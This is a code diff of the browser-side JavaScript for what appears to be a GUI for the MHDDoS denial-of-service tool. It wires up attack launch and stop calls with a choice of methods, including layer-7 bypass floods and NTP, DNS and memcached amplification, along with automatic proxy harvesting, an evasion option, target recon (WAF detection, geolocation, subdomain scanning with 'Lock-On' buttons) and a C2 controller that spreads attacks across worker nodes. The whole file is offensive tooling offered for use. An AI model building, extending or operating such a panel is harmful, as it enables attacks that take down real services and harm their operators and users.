+            const bpsMatch = cleanMsg.match(/BPS:\s*([^,]+)/i);
+            const latMatch = cleanMsg.match(/Latency:\s*([\d\.]+ms|TIMEOUT)/i);
+            
+            if (rpsMatch || bpsMatch) {
+                updateMetrics(rpsMatch ? rpsMatch[1] : "0", bpsMatch ? bpsMatch[1].split(',')[0].trim() : "0 B", latMatch ? latMatch[1] : "0 ms");
+                return;
             }
-        } catch (e) {
-            resultsTable.innerHTML = `<tr><td colspan="3" class="py-12 text-center text-danger">SCAN_FAILED: ${e.message}</td></tr>`;
-        } finally {
-            btn.disabled = false;
-            btn.innerHTML = '<span class="material-symbols-rounded text-sm">radar</span> Scan Network';
+
+            const entry = document.createElement('div');
+            let logType = type;
+            if (cleanMsg.includes("[!]")) logType = 'ERROR';
+            else if (cleanMsg.includes("LAUNCHING") || cleanMsg.includes("DEPLOYED")) logType = 'ATTACK';
+            else if (cleanMsg.includes("[*]")) logType = 'SYSTEM';
+
+            const entryLevel = getMsgLevel(cleanMsg);
+            entry.dataset.level = entryLevel;
+            entry.dataset.type = logType;
+
+            const matchesLevel = (LOG_LEVELS[entryLevel] >= LOG_LEVELS[currentLogLevel]);
+            const matchesFilter = (currentLogFilter === 'ALL' || logType === currentLogFilter);
+            if (!(matchesLevel && matchesFilter)) entry.style.display = 'none';
+
+            entry.className = `log-entry flex gap-4 ${logType === 'ERROR' ? 'text-danger' : entryLevel === 'DEBUG' ? 'text-slate-500 opacity-60' : 'text-slate-400'}`;
+            const label = document.createElement('span');
+            label.className = `shrink-0 font-bold w-20 ${logType === 'ERROR' ? 'text-danger' : logType === 'ATTACK' ? 'text-primary' : 'text-slate-600'}`;
+            label.textContent = `[${logType}]`;
+            const content = document.createElement('span');
+            content.className = "flex-1 break-all";
+            content.textContent = cleanMsg;
+            entry.appendChild(label);
+            entry.appendChild(content);
+            term.appendChild(entry);
+            
+            if (term.scrollHeight - term.clientHeight <= term.scrollTop + 100) term.scrollTop = term.scrollHeight;
+            if (term.childNodes.length > 1000) { for(let i=0; i<10; i++) term.removeChild(term.firstChild); }
         }
-    }
 
-    function setTarget(host, autoScan = false) {
-        document.getElementById('target').value = host;
-        if (autoScan) analyzeTarget();
-    }
-
-    async function startAttack() {
-        const target = document.getElementById('target').value;
-        if (!target) return appendLog("[!] VALIDATION_FAILED: Destination target required.", "ERROR");
-        
-        setAppState(STATE.STARTING);
-        const params = {
-            target: target,
-            method: document.getElementById('method').value,
-            threads: parseInt(document.getElementById('threads').value),
-            duration: parseInt(document.getElementById('duration').value),
-            proxy_type: document.getElementById('proxy_type').value,
-            proxy_list: document.getElementById('auto_harvest').checked ? "auto_harvest.txt" : document.getElementById('proxy_list').value,
-            rpc: parseInt(document.getElementById('rpc').value),
-            reflector: document.getElementById('reflector').value,
-            proxy_refresh: document.getElementById('auto_refresh').checked ? parseInt(document.getElementById('proxy_refresh').value) : 0,
-            auto_harvest: document.getElementById('auto_harvest').checked,
-            smart_rpc: document.getElementById('smart_rpc').checked,
-            autoscale: document.getElementById('auto_scale').checked,
-            evasion: document.getElementById('advanced_evasion').checked
-        };
-
-        try {
-            const res = await fetch('/api/attack/start', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(params)
+        function setLogFilter(filter) {
+            currentLogFilter = filter;
+            document.querySelectorAll('.filter-chip').forEach(c => {
+                c.classList.remove('active', 'bg-primary', 'text-slate-950');
+                c.classList.add('text-slate-500');
             });
-            const data = await res.json();
-            if (data.status === 'error') {
-                appendLog(`[!] DEPLOYMENT_ERR: ${data.message}`, "ERROR");
-                setAppState(STATE.IDLE);
-            } else {
-                saveToMemory();
-            }
-        } catch (e) {
-            appendLog(`[!] API_FAIL: ${e.message}`, "ERROR");
-            setAppState(STATE.IDLE);
+            const activeChip = document.getElementById(`filter-${filter}`);
+            activeChip.classList.add('active', 'bg-primary', 'text-slate-950');
+            activeChip.classList.remove('text-slate-500');
+            refreshLogVisibility();
         }
-    }
 
-    async function stopAttack() {
-        setAppState(STATE.STOPPING);
-        try {
-            const res = await fetch('/api/attack/stop', { method: 'POST' });
-            const data = await res.json();
-            if (data.status === 'error') {
-                appendLog(`[!] ABORT_ERR: ${data.message}`, "ERROR");
+        async function analyzeTarget() {
+            const target = document.getElementById('target').value;
+            if (!target) return appendLog("[!] RECON_ERR: Target required for radar scan.", "ERROR");
+            appendLog(`[*] INITIATING RADAR SCAN: Analyzing infrastructure for ${target}...`);
+            try {
+                const res = await fetch('/api/recon/analyze', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target })
+                });
+                const data = await res.json();
+                if (data.status === 'success') {
+                    appendLog(`[*] RADAR LOCK: Detected Stack = [${data.server}], HTTP ${data.status_code}`);
+                    appendLog(`[*] TACTICAL RECOMMENDATION: Applying ${data.recommendation} sequence.`);
+                    document.getElementById('method').value = data.recommendation;
+                    updateVisibility();
+                    const badgeContainer = document.getElementById('recon-waf-badge');
+                    const wafClass = (data.server || '').toLowerCase().replace(/[\/\s]/g, '');
+                    badgeContainer.innerHTML = `<span class="recon-badge badge-${wafClass}">${data.server} PROTECTED</span>`;
+                } else { appendLog(`[!] RECON_FAIL: ${data.message}`, "ERROR"); }
+            } catch (e) { appendLog(`[!] API_FAIL: ${e.message}`, "ERROR"); }
+            
+            try {
+                const geoRes = await fetch(`/api/recon/geo?target=${encodeURIComponent(target)}`);
+                const geoData = await geoRes.json();
+                if (geoData.status === 'success') {
+                    document.getElementById('geo-isp').textContent = geoData.isp;
+                    document.getElementById('geo-loc').textContent = `${geoData.city}, ${geoData.country}`;
+                    initMap(geoData.lat, geoData.lon);
+                }
+            } catch (e) { console.error(e); }
+        }
+
+        async function startAttack() {
+            const target = document.getElementById('target').value;
+            if (!target) return appendLog("[!] VALIDATION_FAILED: Destination target required.", "ERROR");
+            setAppState(STATE.STARTING);
+            const params = {
+                target: target,
+                method: document.getElementById('method').value,
+                threads: parseInt(document.getElementById('threads').value),
+                duration: parseInt(document.getElementById('duration').value),
+                proxy_type: document.getElementById('proxy_type').value,
+                proxy_list: document.getElementById('auto_harvest').checked ? "auto_harvest.txt" : document.getElementById('proxy_list').value,
+                rpc: parseInt(document.getElementById('rpc').value),
+                reflector: document.getElementById('reflector').value,
+                proxy_refresh: document.getElementById('auto_refresh').checked ? parseInt(document.getElementById('proxy_refresh').value) : 0,
+                auto_harvest: document.getElementById('auto_harvest').checked,
+                smart_rpc: document.getElementById('smart_rpc').checked,
+                autoscale: document.getElementById('auto_scale').checked,
+                evasion: document.getElementById('advanced_evasion').checked,
+                distribute_to_workers: document.getElementById('distribute_to_workers').checked
+            };
+            try {
+                const res = await fetch('/api/attack/start', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(params)
+                });
+                const data = await res.json();
+                if (data.status === 'error') {
+                    appendLog(`[!] DEPLOYMENT_ERR: ${data.message}`, "ERROR");
+                    setAppState(STATE.IDLE);
+                } else { saveToMemory(); }
+            } catch (e) {
+                appendLog(`[!] API_FAIL: ${e.message}`, "ERROR");
+                setAppState(STATE.IDLE);
+            }
+        }
+
+        async function stopAttack() {
+            setAppState(STATE.STOPPING);
+            try {
+                const res = await fetch('/api/attack/stop', { method: 'POST' });
+                const data = await res.json();
+                if (data.status === 'error') {
+                    appendLog(`[!] ABORT_ERR: ${data.message}`, "ERROR");
+                    setAppState(STATE.RUNNING);
+                }
+            } catch (e) {
+                appendLog(`[!] API_FAIL: ${e.message}`, "ERROR");
                 setAppState(STATE.RUNNING);
             }
-        } catch (e) {
-            appendLog(`[!] API_FAIL: ${e.message}`, "ERROR");
-            setAppState(STATE.RUNNING);
         }
-    }
 
-    // --- Helpers ---
-    function updateVisibility() {
-        const method = document.getElementById('method').value;
-        const L7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD", "BOT", "XMLRPC", "BOMB", "TOR"];
-        const L4_AMP = ["MEM", "NTP", "DNS", "RDP"];
-        document.getElementById('rpc-container').style.display = L7.includes(method) ? 'block' : 'none';
-        document.getElementById('reflector-container').style.display = L4_AMP.includes(method) ? 'block' : 'none';
-    }
-
-    function toggleRefreshDropdown() {
-        const checked = document.getElementById('auto_refresh').checked;
-        const container = document.getElementById('refresh-interval-container');
-        container.style.opacity = checked ? "1" : "0.3";
-        container.style.pointerEvents = checked ? "auto" : "none";
-    }
-
-    function toggleHarvest() {
-        const checked = document.getElementById('auto_harvest').checked;
-        const proxyListInput = document.getElementById('proxy_list');
-        if (checked) {
-            proxyListInput.disabled = true;
-            proxyListInput.style.opacity = "0.5";
-        } else {
-            proxyListInput.disabled = false;
-            proxyListInput.style.opacity = "1";
+        function updateVisibility() {
+            const method = document.getElementById('method').value;
+            const L7 = ["BYPASS", "CFB", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"];
+            const L4_AMP = ["MEM", "NTP", "DNS", "RDP"];
+            document.getElementById('rpc-container').style.display = L7.includes(method) ? 'block' : 'none';
+            document.getElementById('reflector-container').style.display = L4_AMP.includes(method) ? 'block' : 'none';
         }
-    }
 
-    const memoryFields = ['target', 'method', 'threads', 'duration', 'proxy_type', 'proxy_list', 'rpc', 'reflector', 'auto_refresh', 'proxy_refresh', 'auto_harvest', 'smart_rpc', 'auto_scale', 'advanced_evasion'];
-    function saveToMemory() {
-        memoryFields.forEach(id => {
-            const el = document.getElementById(id);
-            if(el) localStorage.setItem('mhddos_gui_v113_' + id, el.type === 'checkbox' ? el.checked : el.value);
-        });
-    }
+        function toggleRefreshDropdown() {
+            const checked = document.getElementById('auto_refresh').checked;
+            const container = document.getElementById('refresh-interval-container');
+            container.style.opacity = checked ? "1" : "0.3";
+            container.style.pointerEvents = checked ? "auto" : "none";
+        }
 
-    function loadFromMemory() {
-        memoryFields.forEach(id => {
-            const val = localStorage.getItem('mhddos_gui_v113_' + id);
-            if (val !== null) {
+        function toggleHarvest() {
+            const checked = document.getElementById('auto_harvest').checked;
+            const proxyListInput = document.getElementById('proxy_list');
+            if (checked) {
+                proxyListInput.disabled = true;
+                proxyListInput.style.opacity = "0.5";
+            } else {
+                proxyListInput.disabled = false;
+                proxyListInput.style.opacity = "1";
+            }
+        }
+
+        const memoryFields = ['target', 'method', 'threads', 'duration', 'proxy_type', 'proxy_list', 'rpc', 'reflector', 'auto_refresh', 'proxy_refresh', 'auto_harvest', 'smart_rpc', 'auto_scale', 'advanced_evasion', 'distribute_to_workers'];
+        function saveToMemory() {
+            memoryFields.forEach(id => {
                 const el = document.getElementById(id);
-                if (el && el.type === 'checkbox') el.checked = (val === 'true');
-                else if(el) el.value = val;
-            }
-        });
-    }
-
-    async function checkC2Status() {
-        try {
-            const res = await fetch('/api/c2/status');
-            const data = await res.json();
-            if(data.status === 'success') {
-                document.getElementById('c2-node-id').textContent = data.node_id;
-                document.getElementById('c2-node-id').className = data.is_worker ? 'text-xs font-mono font-bold text-warning' : 'text-xs font-mono font-bold text-secondary';
-                document.getElementById('session-uuid').textContent = `NODE_ID: ${data.node_id} | MODE: ${data.is_worker ? 'WORKER' : 'CONTROLLER'}`;
-            }
-        } catch(e) {
-            console.error("C2 Status Check Failed", e);
-        }
-    }
-
-    // --- Init ---
-    window.onload = () => {
-        loadFromMemory();
-        updateVisibility();
-        toggleRefreshDropdown();
-        toggleHarvest();
-        setupWebSocket();
-        setLogFilter('ALL');
-        checkC2Status();
-        
-        // Initialize Log Level
-        const levelSelect = document.getElementById('log-level-selector');
-        if(levelSelect) levelSelect.value = currentLogLevel;
-        refreshLogVisibility();
-        
-        // Auto-check health
-        fetch('/api/health').then(r => r.json()).then(d => {
-            if (d.engine_active) setAppState(STATE.RUNNING);
-        }).catch(() => {});
-    };
-
-    async function browseFile(inputId) {
-        try {
-            const res = await fetch('/api/select_file');
-            const data = await res.json();
-            if (data.path) document.getElementById(inputId).value = data.path;
-        } catch (e) { console.error(e); }
-    }
-
-    function clearTerminal() {
-        term.innerHTML = '';
-        appendLog("Buffer purged. Intelligence matrix re-calibrated.");
-    }
-
-    async function copyLogs() {
-        const text = Array.from(document.querySelectorAll('.log-entry')).map(e => e.innerText).join('\n');
-        await navigator.clipboard.writeText(text);
-        appendLog("Matrix data exported to clipboard.");
-    }
-
-    async function openConfigModal() {
-        const modal = document.getElementById('config-modal');
-        const content = document.getElementById('config-modal-content');
-        const container = document.getElementById('config-sources-container');
-        
-        modal.classList.remove('hidden');
-        // small delay to allow display:block to apply before transition
-        setTimeout(() => {
-            modal.classList.remove('opacity-0');
-            content.classList.remove('translate-y-4');
-        }, 10);
-        
-        container.innerHTML = '<div class="text-center text-slate-500 py-4"><span class="material-symbols-rounded animate-spin">refresh</span></div>';
-        
-        try {
-            const res = await fetch('/api/config/proxies');
-            const data = await res.json();
-            if (data.status === 'success') {
-                renderConfigSources(data.providers);
-            } else {
-                container.innerHTML = `<div class="text-danger text-sm text-center py-4">Failed to load config: ${data.message}</div>`;
-            }
-        } catch (e) {
-            container.innerHTML = `<div class="text-danger text-sm text-center py-4">Network error: ${e.message}</div>`;
-        }
-    }
-
-    function closeConfigModal() {
-        const modal = document.getElementById('config-modal');
-        const content = document.getElementById('config-modal-content');
-        
-        modal.classList.add('opacity-0');
-        content.classList.add('translate-y-4');
-        
-        setTimeout(() => {
-            modal.classList.add('hidden');
-        }, 300);
-    }
-
-    let configSources = [];
-    
-    function renderConfigSources(providers) {
-        configSources = providers;
-        const container = document.getElementById('config-sources-container');
-        container.innerHTML = '';
-        
-        if (providers.length === 0) {
-            container.innerHTML = '<div class="text-center text-slate-500 py-4 text-xs">No resources defined.</div>';
-            return;
-        }
-
-        providers.forEach((p, index) => {
-            const item = document.createElement('div');
-            item.className = 'flex items-center gap-3 p-3 bg-slate-950 rounded-xl border border-white/5 group';
-            
-            const typeSelect = `
-                <select onchange="updateConfigSource(${index}, 'type', parseInt(this.value))" class="bg-slate-900 border border-slate-700 text-slate-300 text-xs rounded-lg px-2 py-1.5 focus:border-primary outline-none w-24 shrink-0">
-                    <option value="0" ${p.type === 0 ? 'selected' : ''}>ALL</option>
-                    <option value="1" ${p.type === 1 ? 'selected' : ''}>HTTP</option>
-                    <option value="4" ${p.type === 4 ? 'selected' : ''}>SOCKS4</option>
-                    <option value="5" ${p.type === 5 ? 'selected' : ''}>SOCKS5</option>
-                </select>
-            `;
-            
-            item.innerHTML = `
-                ${typeSelect}
-                <input type="text" value="${p.url}" oninput="document.getElementById('config-modal-error').classList.add('hidden')" onchange="updateConfigSource(${index}, 'url', this.value)" placeholder="https://... or C:\\path\\to\\proxies.txt" class="flex-1 bg-transparent border-b border-slate-800 text-slate-300 text-xs px-2 py-1 focus:border-primary outline-none transition-colors" />
-                <div class="flex items-center gap-1 shrink-0 w-24">
-                    <input type="number" value="${p.timeout}" onchange="updateConfigSource(${index}, 'timeout', parseInt(this.value))" min="1" class="w-12 bg-slate-900 border border-slate-700 text-slate-300 text-xs rounded-lg px-2 py-1.5 focus:border-primary outline-none text-center" title="Timeout (s)" />
-                    <span class="text-[10px] text-slate-500">sec</span>
-                </div>
-                <button onclick="removeConfigSource(${index})" class="text-slate-600 hover:text-danger opacity-0 group-hover:opacity-100 transition-all focus:outline-none shrink-0" title="Delete">
-                    <span class="material-symbols-rounded text-lg">delete</span>
-                </button>
-            `;
-            container.appendChild(item);
-        });
-    }
-
-    function updateConfigSource(index, field, value) {
-        configSources[index][field] = value;
-    }
-
-    function addConfigSource() {
-        configSources.push({ type: 1, url: "https://", timeout: 5 });
-        renderConfigSources(configSources);
-    }
-
-    function removeConfigSource(index) {
-        configSources.splice(index, 1);
-        renderConfigSources(configSources);
-    }
-
-    async function saveConfigModal() {
-        const btn = document.querySelector('#config-modal-content button.bg-primary');
-        const originalText = btn.innerHTML;
-        const errorBox = document.getElementById('config-modal-error');
-        const errorText = document.getElementById('config-modal-error-text');
-        
-        const showError = (msg) => {
-            errorText.textContent = msg;
-            errorBox.classList.remove('hidden');
-        };
-        errorBox.classList.add('hidden');
-        
-        // Validation
-        for (let i = 0; i < configSources.length; i++) {
-            const src = configSources[i].url.trim();
-            if (!src) {
-                showError(`Error at row ${i + 1}: Path cannot be empty.`);
-                return;
-            }
-            if (src.startsWith('http://') || src.startsWith('https://')) {
-                try {
-                    new URL(src);
-                } catch (_) {
-                    showError(`Error at row ${i + 1}: Invalid web URL format.`);
-                    return;
-                }
-            } else if (!src.endsWith('.txt') && !src.endsWith('.json') && !src.includes('\\') && !src.includes('/')) {
-                showError(`Error at row ${i + 1}: Invalid local file path or URL.`);
-                return;
-            }
-        }
-
-        btn.innerHTML = '<span class="material-symbols-rounded animate-spin">refresh</span> Saving...';
-        btn.disabled = true;
-
-        try {
-            const res = await fetch('/api/config/proxies', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ providers: configSources })
+                if(el) localStorage.setItem('mhddos_gui_v113_' + id, el.type === 'checkbox' ? el.checked : el.value);
             });
-            const data = await res.json();
-            
-            if (data.status === 'success') {
-                btn.innerHTML = '<span class="material-symbols-rounded">check</span> Saved';
-                btn.classList.replace('bg-primary', 'bg-green-500');
-                setTimeout(() => {
-                    closeConfigModal();
-                    btn.innerHTML = originalText;
-                    btn.classList.replace('bg-green-500', 'bg-primary');
-                    btn.disabled = false;
-                }, 1000);
-            } else {
-                showError("Save Failed: " + data.message);
-                btn.innerHTML = originalText;
-                btn.disabled = false;
+        }
+
+        function loadFromMemory() {
+            memoryFields.forEach(id => {
+                const val = localStorage.getItem('mhddos_gui_v113_' + id);
+                if (val !== null) {
+                    const el = document.getElementById(id);
+                    if (el) {
+                        if (el.type === 'checkbox') el.checked = (val === 'true');
+                        else el.value = val;
+                    }
+                }
+            });
+            // Attach auto-save listeners to all fields
+            memoryFields.forEach(id => {
+                const el = document.getElementById(id);
+                if (el) {
+                    const eventType = (el.tagName === 'SELECT' || el.type === 'checkbox' || el.type === 'number') ? 'change' : 'input';
+                    el.addEventListener(eventType, saveToMemory);
+                }
+            });
+        }
+
+        async function checkC2Status() {
+            document.getElementById('c2-node-id').textContent = 'C2_MASTER';
+            document.getElementById('c2-node-id').className = 'text-xs font-mono font-bold text-secondary';
+            document.getElementById('session-uuid').textContent = 'MODE: C2_CONTROLLER | LISTENING';
+        }
+
+        async function refreshC2Nodes() {
+            try {
+                const res = await fetch('/api/c2/nodes');
+                const data = await res.json();
+                if (data.status === 'success') {
+                    const tbody = document.getElementById('c2-worker-list');
+                    document.getElementById('c2-worker-count').textContent = data.workers.length;
+                    
+                    if (data.workers.length === 0) {
+                        tbody.innerHTML = '<tr><td colspan="4" class="py-8 text-center text-slate-600 italic">No worker nodes connected.</td></tr>';
+                        return;
+                    }
+                    
+                    tbody.innerHTML = data.workers.map(w => `
+                        <tr class="hover:bg-white/[0.02] transition-colors">
+                            <td class="py-3 px-4 text-secondary font-bold flex items-center gap-2"><div class="size-2 rounded-full bg-secondary pulse-active"></div>${w.node_id}</td>
+                            <td class="py-3 px-4 text-slate-400">${w.hostname} <span class="text-[9px] text-slate-600 block">${w.os}</span></td>
+                            <td class="py-3 px-4">
+                                <div class="flex items-center gap-2 mb-1">
+                                    <div class="w-16 h-1.5 bg-slate-800 rounded-full overflow-hidden"><div class="h-full bg-primary" style="width: ${w.cpu_percent}%"></div></div>
+                                    <span class="text-[9px] text-slate-500 w-6">${w.cpu_percent}%</span>
+                                </div>
+                                <div class="flex items-center gap-2">
+                                    <div class="w-16 h-1.5 bg-slate-800 rounded-full overflow-hidden"><div class="h-full bg-warning" style="width: ${w.ram_percent}%"></div></div>
+                                    <span class="text-[9px] text-slate-500 w-6">${w.ram_percent}%</span>
+                                </div>
+                            </td>
+                            <td class="py-3 px-4 text-right">
+                                <span class="px-2 py-1 rounded-md text-[9px] font-black uppercase tracking-widest ${w.status === 'busy' ? 'bg-warning/20 text-warning border border-warning/30' : 'bg-primary/20 text-primary border border-primary/30'}">
+                                    ${w.status === 'busy' ? 'COMBAT' : 'IDLE'}
+                                </span>
+                            </td>
+                        </tr>
+                    `).join('');
+                }
+            } catch(e) { console.error("Error fetching C2 nodes:", e); }
+        }
+
+        async function setupWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            ws = new WebSocket(`${protocol}//${window.location.host}/ws/logs`);
+            ws.onopen = () => {
+                document.getElementById('connection-status').className = 'size-2 rounded-full bg-primary pulse-active';
+                document.getElementById('header-status-text').textContent = "GRID_CONNECTED";
+            };
+            ws.onmessage = (event) => { 
+                const msg = event.data;
+                appendLog(msg);
+                if (msg.includes("COMMAND DEPLOYED")) setAppState(STATE.RUNNING);
+                if (msg.includes("COMMAND TERMINATED")) setAppState(STATE.IDLE);
+            };
+            ws.onclose = () => {
+                document.getElementById('connection-status').className = 'size-2 rounded-full bg-danger pulse-active';
+                document.getElementById('header-status-text').textContent = "OFFLINE_RECONNECTING";
+                setTimeout(setupWebSocket, 3000);
+            };
+        }
+
+        async function browseFile(inputId) {
+            try {
+                const res = await fetch('/api/select_file');
+                const data = await res.json();
+                if (data.path) document.getElementById(inputId).value = data.path;
+            } catch (e) { console.error(e); }
+        }
+
+        function clearTerminal() { term.innerHTML = ''; appendLog("Buffer purged. Intelligence matrix re-calibrated."); }
+        async function copyLogs() {
+            const text = Array.from(document.querySelectorAll('.log-entry')).map(e => e.innerText).join('\n');
+            await navigator.clipboard.writeText(text);
+            appendLog("Matrix data exported to clipboard.");
+        }
+
+        // --- Config Modal Logic ---
+        async function openConfigModal() {
+            const modal = document.getElementById('config-modal');
+            const content = document.getElementById('config-modal-content');
+            const container = document.getElementById('config-sources-container');
+            modal.classList.remove('hidden');
+            setTimeout(() => { modal.classList.remove('opacity-0'); content.classList.remove('translate-y-4'); }, 10);
+            container.innerHTML = '<div class="text-center text-slate-500 py-4"><span class="material-symbols-rounded animate-spin">refresh</span></div>';
+            try {
+                const res = await fetch('/api/config/proxies');
+                const data = await res.json();
+                if (data.status === 'success') renderConfigSources(data.providers);
+            } catch (e) { console.error(e); }
+        }
+
+        function closeConfigModal() {
+            const modal = document.getElementById('config-modal');
+            const content = document.getElementById('config-modal-content');
+            modal.classList.add('opacity-0'); content.classList.add('translate-y-4');
+            setTimeout(() => modal.classList.add('hidden'), 300);
+        }
+
+        let configSources = [];
+        function renderConfigSources(providers) {
+            configSources = providers;
+            const container = document.getElementById('config-sources-container');
+            container.innerHTML = '';
+            if (providers.length === 0) { container.innerHTML = '<div class="text-center text-slate-500 py-4 text-xs">No resources defined.</div>'; return; }
+            providers.forEach((p, index) => {
+                const item = document.createElement('div');
+                item.className = 'flex items-center gap-3 p-3 bg-slate-950 rounded-xl border border-white/5 group';
+                item.innerHTML = `
+                    <select onchange="updateConfigSource(${index}, 'type', parseInt(this.value))" class="bg-slate-900 border border-slate-700 text-slate-300 text-xs rounded-lg px-2 py-1.5 focus:border-primary outline-none w-24 shrink-0">
+                        <option value="0" ${p.type === 0 ? 'selected' : ''}>ALL</option>
+                        <option value="1" ${p.type === 1 ? 'selected' : ''}>HTTP</option>
+                        <option value="4" ${p.type === 4 ? 'selected' : ''}>SOCKS4</option>
+                        <option value="5" ${p.type === 5 ? 'selected' : ''}>SOCKS5</option>
+                    </select>
+                    <input type="text" value="${p.url}" onchange="updateConfigSource(${index}, 'url', this.value)" class="flex-1 bg-transparent border-b border-slate-800 text-slate-300 text-xs px-2 py-1 focus:border-primary outline-none" />
+                    <button onclick="removeConfigSource(${index})" class="text-slate-600 hover:text-danger opacity-0 group-hover:opacity-100 transition-all"><span class="material-symbols-rounded">delete</span></button>
+                `;
+                container.appendChild(item);
+            });
+        }
+
+        function updateConfigSource(index, field, value) { configSources[index][field] = value; }
+        function removeConfigSource(index) { configSources.splice(index, 1); renderConfigSources(configSources); }
+        function addConfigSource() { configSources.push({ type: 5, url: '', timeout: 10 }); renderConfigSources(configSources); }
+        async function saveProxyConfig() {
+            try {
+                const res = await fetch('/api/config/proxies', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ providers: configSources }) });
+                const data = await res.json();
+                if(data.status === 'success') closeConfigModal();
+            } catch (e) { console.error(e); }
+        }
+
+        async function scanSubdomains() {
+            const target = document.getElementById('target').value;
+            if(!target) return;
+            const btn = document.getElementById('subdomain-scan-btn');
+            const table = document.getElementById('subdomain-results');
+            btn.disabled = true; btn.innerHTML = '<span class="material-symbols-rounded text-sm animate-spin">refresh</span> Scanning...';
+            table.innerHTML = '<tr><td colspan="3" class="py-12 text-center text-primary animate-pulse font-bold uppercase tracking-widest">Discovering attack surfaces...</td></tr>';
+            try {
+                const res = await fetch('/api/recon/subdomains', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ target }) });
+                const data = await res.json();
+                if(data.status === 'success' && data.subdomains.length > 0) {
+                    table.innerHTML = data.subdomains.map(s => `<tr><td class="py-3 px-4 text-white font-bold">${s.subdomain}</td><td class="py-3 px-4 text-slate-400">${s.ip}</td><td class="py-3 px-4 text-right"><button onclick="quickAttack('${s.subdomain}')" class="text-primary hover:text-primary-light uppercase font-black text-[9px] tracking-widest border border-primary/30 px-2 py-1 rounded-md">Lock-On</button></td></tr>`).join('');
+                } else { table.innerHTML = '<tr><td colspan="3" class="py-12 text-center text-slate-600 italic">No additional endpoints identified.</td></tr>'; }
+            } catch(e) { console.error(e); }
+            btn.disabled = false; btn.innerHTML = '<span class="material-symbols-rounded text-sm">radar</span> Scan Network';
+        }
+
+        function quickAttack(target) { document.getElementById('target').value = target; analyzeTarget(); }
+
+        // --- Tactical Tools Logic ---
+        let currentTool = 'ping';
+
+        function openToolsModal() {
+            const modal = document.getElementById('tools-modal');
+            const content = document.getElementById('tools-modal-content');
+            modal.classList.remove('hidden');
+            setTimeout(() => { modal.classList.remove('opacity-0'); content.classList.remove('translate-y-4'); }, 10);
+            const mainTarget = document.getElementById('target').value;
+            if (mainTarget) {
+                const host = mainTarget.replace(/https?:\/\//, '').split('/')[0];
+                document.getElementById('tool-target').value = host;
             }
-        } catch (e) {
-            showError("Network Error: " + e.message);
-            btn.innerHTML = originalText;
-            btn.disabled = false;
         }
-    }
 
-    // --- Tactical Tools Logic ---
-    let currentTool = 'ping';
-
-    function openToolsModal() {
-        const modal = document.getElementById('tools-modal');
-        const content = document.getElementById('tools-modal-content');
-        modal.classList.remove('hidden');
-        setTimeout(() => {
-            modal.classList.remove('opacity-0');
-            content.classList.remove('translate-y-4');
-        }, 10);
-        
-        // Auto-fill from main target if available
-        const mainTarget = document.getElementById('target').value;
-        if (mainTarget) {
-            const host = mainTarget.replace(/https?:\/\//, '').split('/')[0];
-            document.getElementById('tool-target').value = host;
+        function closeToolsModal() {
+            const modal = document.getElementById('tools-modal');
+            const content = document.getElementById('tools-modal-content');
+            modal.classList.add('opacity-0'); content.classList.add('translate-y-4');
+            setTimeout(() => modal.classList.add('hidden'), 300);
         }
-    }
 
-    function closeToolsModal() {
-        const modal = document.getElementById('tools-modal');
-        const content = document.getElementById('tools-modal-content');
-        modal.classList.add('opacity-0');
-        content.classList.add('translate-y-4');
-        setTimeout(() => modal.classList.add('hidden'), 300);
-    }
+        function switchToolTab(tool) {
+            currentTool = tool;
+            document.querySelectorAll('.tool-tab').forEach(t => { t.classList.remove('bg-primary', 'text-slate-950'); t.classList.add('text-slate-500', 'hover:text-white'); });
+            const active = document.getElementById(`tab-${tool}`);
+            active.classList.add('bg-primary', 'text-slate-950'); active.classList.remove('text-slate-500', 'hover:text-white');
+            const label = document.getElementById('tool-input-label');
+            if (tool === 'check') label.textContent = 'Target URL'; else label.textContent = 'Target Host / IP';
+        }
 
-    function switchToolTab(tool) {
-        currentTool = tool;
-        document.querySelectorAll('.tool-tab').forEach(t => {
-            t.classList.remove('bg-primary', 'text-slate-950');
-            t.classList.add('text-slate-500', 'hover:text-white');
-        });
-        const active = document.getElementById(`tab-${tool}`);
-        active.classList.add('bg-primary', 'text-slate-950');
-        active.classList.remove('text-slate-500', 'hover:text-white');
-        
-        const label = document.getElementById('tool-input-label');
-        if (tool === 'check') label.textContent = 'Target URL';
-        else label.textContent = 'Target Host / IP';
-    }
+        async function executeTool() {
+            const target = document.getElementById('tool-target').value;
+            const resultArea = document.getElementById('tool-result');
+            const btn = document.getElementById('tool-exec-btn');
+            if (!target) return alert("Target required for diagnostic.");
+            btn.disabled = true; btn.innerHTML = '<span class="material-symbols-rounded animate-spin">refresh</span> Processing...';
+            resultArea.innerHTML = `<div class="text-primary font-bold animate-pulse">> Initializing ${currentTool.toUpperCase()} protocol...</div>`;
+            try {
+                const res = await fetch(`/api/tools/${currentTool}?${currentTool === 'check' ? 'url' : 'host'}=${encodeURIComponent(target)}`);
+                const data = await res.json();
+                if (data.status === 'error') { resultArea.innerHTML = `<div class="text-danger">[!] ERROR: ${data.message}</div>`; } else { renderToolResult(data); }
+            } catch (e) { resultArea.innerHTML = `<div class="text-danger">[!] NETWORK_FAIL: ${e.message}</div>`; } finally { btn.disabled = false; btn.innerHTML = '<span class="material-symbols-rounded text-lg">play_arrow</span> Run'; }
+        }
 
-    async function executeTool() {
-        const target = document.getElementById('tool-target').value;
-        const resultArea = document.getElementById('tool-result');
-        const btn = document.getElementById('tool-exec-btn');
-        
-        if (!target) return alert("Target required for diagnostic.");
-        
-        btn.disabled = true;
-        btn.innerHTML = '<span class="material-symbols-rounded animate-spin">refresh</span> Processing...';
